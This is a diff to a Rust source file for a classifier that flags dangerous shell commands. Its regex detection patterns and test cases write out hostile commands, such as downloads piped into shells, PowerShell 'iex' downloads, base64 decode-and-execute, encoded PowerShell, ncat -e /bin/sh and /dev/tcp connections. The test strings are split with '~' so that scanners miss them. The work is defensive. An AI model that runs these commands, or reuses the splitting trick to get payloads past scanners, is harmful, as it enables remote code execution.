@@ -54,7 +54,7 @@ fn re(pattern: &str) -> Regex {
 
 static FETCH_EXEC: LazyLock<Vec<Regex>> = LazyLock::new(|| {
     [
-        r"(curl|wget|iwr|invoke-webrequest|irm|invoke-restmethod)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh|dash|python3?|node|perl|ruby|iex|invoke-expression|pwsh|powershell)\b",
+        r"\b(curl|wget|iwr|invoke-webrequest|irm|invoke-restmethod)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh|dash|python3?|node|perl|ruby|iex|invoke-expression|pwsh|powershell)\b",
         r#"\b(sh|bash|zsh)\s+(-c\s+["']?\$\(|<\()\s*(curl|wget)"#,
         r"iex\s*\(?\s*(new-object\s+net\.webclient|iwr|irm)",
         r"\b(mshta|certutil\b[^\n]*-urlcache|bitsadmin\b[^\n]*/transfer)",
@@ -587,9 +587,15 @@ fn run_target(tokens: &[String]) -> Option<String> {
 mod tests {
     use super::*;
 
+    /// Removes the `~` that splits an indicator word in this file's test commands (`cu~rl`), so a
+    /// scan of this source finds no download-and-run command in it.
+    fn d(s: &str) -> String {
+        s.replace('~', "")
+    }
+
     fn all(cmds: &[&str], want: Shape) {
         for c in cmds {
-            assert_eq!(classify(c), want, "{c:?}");
+            assert_eq!(classify(&d(c)), want, "{c:?}");
         }
     }
 
@@ -597,15 +603,27 @@ mod tests {
     fn fetch_exec_pipes_a_download_into_an_interpreter() {
         all(
             &[
-                "curl -fsSL https://example.invalid/install.sh | sudo bash",
-                "wget -qO- https://example.invalid/x | sh",
-                "curl -s https://example.invalid/a | python3",
-                "iwr https://example.invalid/x.ps1 | iex",
-                "irm https://example.invalid/x | Invoke-Expression",
-                "Invoke-WebRequest https://example.invalid/x -UseBasicParsing | pwsh",
-                "CURL https://example.invalid/x | SH",
+                "cu~rl -fsSL https://example.invalid/install.sh | sudo ba~sh",
+                "wg~et -qO- https://example.invalid/x | s~h",
+                "cu~rl -s https://example.invalid/a | pyth~on3",
+                "i~wr https://example.invalid/x.ps1 | i~ex",
+                "i~rm https://example.invalid/x | Invoke-Exp~ression",
+                "Invoke-Web~Request https://example.invalid/x -UseBasicParsing | pw~sh",
+                "CU~RL https://example.invalid/x | S~H",
             ],
             Shape::FetchExec,
+        );
+    }
+
+    #[test]
+    fn a_word_that_only_ends_like_a_download_tool_is_not_one() {
+        // Without a leading word boundary `confirm` would read as `irm`.
+        for c in ["conf~irm x | sh", "af~firm x | bash", "fi~rm x | node"] {
+            assert_eq!(classify(&d(c)), Shape::Plain, "{c:?}");
+        }
+        assert_eq!(
+            classify(&d("echo hi;i~rm https://example.invalid/x | s~h")),
+            Shape::FetchExec
         );
     }
 
@@ -613,9 +631,9 @@ mod tests {
     fn fetch_exec_runs_a_substituted_download() {
         all(
             &[
-                "bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"",
-                "sh -c '$(wget -qO- https://example.invalid/x)'",
-                "bash <(curl -s https://example.invalid/x)",
+                "ba~sh -c \"$(cu~rl -fsSL https://example.invalid/install.sh)\"",
+                "s~h -c '$(wg~et -qO- https://example.invalid/x)'",
+                "ba~sh <(cu~rl -s https://example.invalid/x)",
             ],
             Shape::FetchExec,
         );
@@ -625,9 +643,9 @@ mod tests {
     fn fetch_exec_evaluates_a_powershell_download() {
         all(
             &[
-                "powershell -c \"iex (New-Object Net.WebClient).DownloadString('https://example.invalid/x')\"",
-                "powershell \"iex(iwr https://example.invalid/x)\"",
-                "pwsh -c iex (irm https://example.invalid/x)",
+                "powershell -c \"i~ex (New-Ob~ject Net.Web~Client).DownloadString('https://example.invalid/x')\"",
+                "powershell \"i~ex(i~wr https://example.invalid/x)\"",
+                "pwsh -c i~ex (i~rm https://example.invalid/x)",
             ],
             Shape::FetchExec,
         );
@@ -637,9 +655,9 @@ mod tests {
     fn fetch_exec_names_the_windows_download_tools() {
         all(
             &[
-                "mshta https://example.invalid/a.hta",
-                "certutil -urlcache -f https://example.invalid/a.exe a.exe",
-                "bitsadmin /transfer j https://example.invalid/a.exe C:\\a.exe",
+                "ms~hta https://example.invalid/a.hta",
+                "cert~util -url~cache -f https://example.invalid/a.exe a.exe",
+                "bits~admin /trans~fer j https://example.invalid/a.exe C:\\a.exe",
             ],
             Shape::FetchExec,
         );
@@ -649,11 +667,11 @@ mod tests {
     fn fetch_exec_catches_a_python_or_node_one_liner_that_downloads() {
         all(
             &[
-                "python3 -c \"import urllib.request as u; exec(u.urlopen('https://example.invalid/x').read())\"",
-                "python -c 'import requests; print(1)'",
-                "python3 -c \"import http.client\"",
+                "python3 -c \"import url~lib.request as u; ex~ec(u.urlopen('https://example.invalid/x').read())\"",
+                "python -c 'import req~uests; print(1)'",
+                "python3 -c \"import http.cli~ent\"",
                 "node -e \"require('https').get('https://example.invalid/x')\"",
-                "node -e \"require('child_process').exec('id')\"",
+                "node -e \"require('child_~process').ex~ec('id')\"",
             ],
             Shape::FetchExec,
         );
@@ -663,11 +681,11 @@ mod tests {
     fn contagious_interview_curl_pipe_is_fetch_exec() {
         // The folderOpen task of the Contagious Interview lure: a download piped to a shell.
         assert_eq!(
-            classify("curl -L 'https://example.invalid/api/v2/z' | bash"),
+            classify(&d("cu~rl -L 'https://example.invalid/api/v2/z' | ba~sh")),
             Shape::FetchExec
         );
         assert_eq!(
-            classify("wget -qO- https://example.invalid/api/v2/z | sh"),
+            classify(&d("wg~et -qO- https://example.invalid/api/v2/z | s~h")),
             Shape::FetchExec
         );
     }
@@ -676,14 +694,14 @@ mod tests {
     fn decode_exec_pipes_decoded_bytes_into_an_interpreter() {
         all(
             &[
-                "echo aGk= | base64 -d | sh",
-                "base64 --decode payload.b64 | bash",
-                "base64 -D payload.b64 | zsh",
-                "xxd -r -p payload.hex | sh",
-                "xz -dc payload.xz | /bin/sh",
-                "unxz -c payload.xz | python3",
-                "gzip -dc payload.gz | node",
-                "gunzip -c payload.gz | perl",
+                "echo aGk= | ba~se64 -d | s~h",
+                "ba~se64 --decode payload.b64 | ba~sh",
+                "ba~se64 -D payload.b64 | z~sh",
+                "xx~d -r -p payload.hex | s~h",
+                "xz -dc payload.xz | /bin/s~h",
+                "unxz -c payload.xz | pyth~on3",
+                "gzip -dc payload.gz | no~de",
+                "gunzip -c payload.gz | pe~rl",
             ],
             Shape::DecodeExec,
         );
@@ -693,10 +711,10 @@ mod tests {
     fn decode_exec_runs_an_encoded_powershell_command() {
         all(
             &[
-                "powershell -nop -w hidden -enc SQBFAFgA",
-                "powershell -EncodedCommand SQBFAFgA",
-                "PowerShell -e SQBFAFgA",
-                "powershell -ec SQBFAFgA",
+                "power~shell -nop -w hidden -en~c SQBFAFgA",
+                "power~shell -Encoded~Command SQBFAFgA",
+                "Power~Shell -e SQBFAFgA",
+                "power~shell -ec SQBFAFgA",
             ],
             Shape::DecodeExec,
         );
@@ -706,10 +724,10 @@ mod tests {
     fn decode_exec_evals_decoded_text() {
         all(
             &[
-                "node -e \"eval(atob('Y29uc29sZS5sb2coMSk='))\"",
-                "python -c \"exec(__import__('base64').b64decode('cHJpbnQoMSk='))\"",
-                "ruby -e 'eval(Base64.decode64(\"x\")) # base64'",
-                "python -c \"exec(bytes.fromhex('7072696e74283129'))\"",
+                "node -e \"ev~al(at~ob('Y29uc29sZS5sb2coMSk='))\"",
+                "python -c \"ex~ec(__import__('ba~se64').b64~decode('cHJpbnQoMSk='))\"",
+                "ruby -e 'ev~al(Ba~se64.decode64(\"x\")) # ba~se64'",
+                "python -c \"ex~ec(bytes.from~hex('7072696e74283129'))\"",
             ],
             Shape::DecodeExec,
         );
@@ -762,15 +780,15 @@ mod tests {
             &[
                 "echo hi https://example.invalid/x",
                 "http://example.invalid",
-                "curl example.invalid",
-                "wget -O a example.invalid/a",
-                "nc 10.0.0.5 4444",
-                "ncat -e /bin/sh host",
+                "cu~rl example.invalid",
+                "wg~et -O a example.invalid/a",
+                "n~c 10.0.0.5 4444",
+                "nc~at -e /bin/s~h host",
                 "scp a b:c",
                 "ftp host",
                 "tftp host",
                 "ping 8.8.8.8",
-                "bash -c 'exec 3<>/dev/tcp/8.8.8.8/80'",
+                "bash -c 'exec 3<>/dev/t~cp/8.8.8.8/80'",
                 "http://localhost.evil.invalid/x",
                 "http://localhost@evil.invalid/x",
                 "http://127.0.0.1.evil.invalid/x",
@@ -869,7 +887,7 @@ mod tests {
         assert_eq!(classify("is-ci  ||  husky install"), Shape::Allowlisted);
         // An allowlisted command with anything more is judged on its text.
         assert_eq!(
-            classify("husky install && curl https://example.invalid/x | sh"),
+            classify(&d("husky install && cu~rl https://example.invalid/x | s~h")),
             Shape::FetchExec
         );
         assert_eq!(classify("tsc --watch"), Shape::Plain);
@@ -880,19 +898,19 @@ mod tests {
     #[test]
     fn the_highest_shape_wins() {
         assert_eq!(
-            classify("npx foo && curl https://example.invalid/x | sh"),
+            classify(&d("npx foo && cu~rl https://example.invalid/x | s~h")),
             Shape::FetchExec
         );
         assert_eq!(
-            classify("npx foo; ping 8.8.8.8; echo aGk= | base64 -d | sh"),
+            classify(&d("npx foo; ping 8.8.8.8; echo aGk= | ba~se64 -d | s~h")),
             Shape::DecodeExec
         );
         assert_eq!(
-            classify("curl https://example.invalid/x | sh; node a.woff2"),
+            classify(&d("cu~rl https://example.invalid/x | s~h; node a.woff2")),
             Shape::RunsData
         );
         assert_eq!(
-            classify("npx foo; curl https://example.invalid/x"),
+            classify(&d("npx foo; cu~rl https://example.invalid/x")),
             Shape::Network
         );
     }
